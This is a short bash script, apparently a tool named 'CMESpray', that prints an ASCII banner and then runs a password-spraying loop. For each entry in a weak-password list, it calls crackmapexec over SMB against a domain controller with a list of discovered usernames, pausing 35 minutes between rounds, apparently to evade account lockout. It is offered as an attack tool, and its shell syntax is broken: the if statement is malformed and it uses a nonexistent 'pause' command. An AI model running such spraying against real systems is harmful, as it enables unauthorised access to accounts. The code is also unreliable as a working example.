#! /bin/bash

echo "  /$$$$$$  /$$      /$$ /$$$$$$$$  /$$$$$$                                        ";
echo " /$$__  $$| $$$    /$$$| $$_____/ /$$__  $$                                       ";
echo "| $$  \__/| $$$$  /$$$$| $$      | $$  \__/  /$$$$$$   /$$$$$$  /$$$$$$  /$$   /$$";
echo "| $$      | $$ $$/$$ $$| $$$$$   |  $$$$$$  /$$__  $$ /$$__  $$|____  $$| $$  | $$";
echo "| $$      | $$  $$$| $$| $$__/    \____  $$| $$  \ $$| $$  \__/ /$$$$$$$| $$  | $$";
echo "| $$    $$| $$\  $ | $$| $$       /$$  \ $$| $$  | $$| $$      /$$__  $$| $$  | $$";
echo "|  $$$$$$/| $$ \/  | $$| $$$$$$$$|  $$$$$$/| $$$$$$$/| $$     |  $$$$$$$|  $$$$$$$";
echo " \______/ |__/     |__/|________/ \______/ | $$____/ |__/      \_______/ \____  $$";
echo "                                           | $$                          /$$  | $$";
echo "                                           | $$                         |  $$$$$$/";
echo "                                           |__/                          \______/ ";
echo "                                                                                  ";
echo "                                                                                  ";
echo "                                                                                  ";
echo "                                                                                  ";
echo "local (y/n): $1";
# setup local auth if $1 = y or Y
if [$1 = "y"] || [$1="Y"]; l="--local-auth"; else l=""
echo $l
pause
for i in $(cat lists/weak_passwords.txt); do crackmapexec smb "dc_ip" -u discovered-usernames.txt -p $i; echo $i; sleep 35m; done 
